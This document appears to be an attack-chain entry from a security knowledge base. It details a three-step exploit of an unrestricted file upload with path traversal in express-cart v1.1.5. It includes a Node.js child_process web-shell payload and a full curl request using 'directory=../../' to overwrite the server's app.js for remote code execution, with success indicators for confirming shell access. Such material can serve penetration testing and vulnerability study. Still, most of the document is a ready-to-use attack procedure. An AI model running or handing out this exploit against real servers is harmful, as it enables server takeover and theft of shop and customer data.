---
tags:
  - unrestricted-file-upload
  - path-traversal
  - rce
  - node-js
  - express
type: attack_chain
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
  - Node.js
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Obtain-Administrator-Privileges]]'
  - '[[procedures/Prepare-Malicious-JavaScript-File]]'
  - '[[procedures/Exploit-File-Upload-with-Path-Traversal]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Remote File Copy]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T05:32:13.081Z'
description: >-
  Multi-stage attack exploiting unrestricted file upload and path traversal in
  express-cart v1.1.5 to achieve remote code execution by overwriting server
  files.
id: 8ce1a258-47ae-4852-976e-5fde7a5a765f
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Remote File Copy]]'
  - '[[JavaScript]]'
---
---

# Unrestricted File Upload with Path Traversal Leading to RCE in Express-Cart

Multi-stage attack chain demonstrating exploitation of the file upload vulnerability in express-cart version 1.1.5, allowing authenticated admins to upload arbitrary files to server paths, leading to remote code execution via file overwrite and potential denial-of-service.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Obtain Admin Access] --> B[Prepare Malicious Payload]
    B --> C[Upload and Traverse Path for RCE]
    C --> D[Execute and Verify RCE]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]

### Target Environment

- Node.js web application running express-cart v1.1.5
- Exposed on port 1111
- Services: MongoDB, Stripe, PayPal, Authorize.net

### Initial Access Requirements

- Valid administrator credentials or session cookie
- Knowledge of a valid product ID from the database
- Network access to the admin interface

## Detailed Attack Procedures

### Step 1: Obtain Administrator Privileges
procedure: [[procedures/Obtain-Administrator-Privileges]]

**Objective**: Gain authenticated access to the admin file upload functionality.

**Instructions**: Log in to the express-cart admin interface using valid administrator credentials to obtain a session cookie (connect.sid). Identify a valid product ID, such as from the products list in the database or UI.

**Expected Output**: Valid session cookie and product ID ready for use in subsequent requests.

**Success Indicators**:
- Successful login response (HTTP 200)
- Admin dashboard accessible
- Product ID retrieved (e.g., 5ae2228d995e3e5d7c96474d)

### Step 2: Prepare Malicious JavaScript File
procedure: [[procedures/Prepare-Malicious-JavaScript-File]]

**Objective**: Create a payload file that can be uploaded to achieve RCE, such as overwriting app.js with malicious code.

**Instructions**: On your local machine, create a file named malicious.js containing JavaScript code for a web shell, e.g., `require('child_process').exec('whoami', (err, stdout) => { console.log(stdout); });` or more advanced backdoor logic to execute arbitrary commands.

**Expected Output**: Local file malicious.js prepared for upload.

**Success Indicators**:
- File created and contents verified
- Payload syntax checked for Node.js compatibility

### Step 3: Exploit File Upload with Path Traversal
procedure: [[procedures/Exploit-File-Upload-with-Path-Traversal]]

**Objective**: Upload the malicious file to an arbitrary server path using path traversal to overwrite critical files like app.js, enabling RCE.

**Instructions**: Use [[commands/curl-admin-file-upload-exploit]] to send a multipart POST request to the /admin/file/upload endpoint:

```bash
curl -F "upload_file=@malicious.js" -F "productId=5ae2228d995e3e5d7c96474d" -F "directory=../../" -b "connect.sid=s%3A_Sk6p9CeBMZo2H67lFqJAAWTcI0Ikr-W.Q7Nk5vieLBnGtn4XIqXu945tg4YoYXhDdzY0uXeP%2FCQ" "http://localhost:1111/admin/file/upload"
```

Replace the cookie and productId with your obtained values. The directory=../../ traverses to the root directory. After upload, restart the server or trigger execution to run the malicious code.

**Expected Output**: HTTP response indicating successful upload (e.g., JSON with success message). Verify file overwrite on server filesystem.

**Success Indicators**:
- HTTP 200 response from upload endpoint
- Malicious file present at target path (e.g., /app.js overwritten)
- RCE confirmed by executing commands via the backdoor (e.g., shell access)

## Attack Chain Summary

### Key Achievements

1. Authenticated access to vulnerable upload endpoint
2. Arbitrary file write via path traversal, overwriting app.js for RCE
3. Potential DoS through unlimited file size uploads

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Remote File Copy]]
- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Initial Access]]

---

*Last updated: 2023-10-01T00:00:00Z*
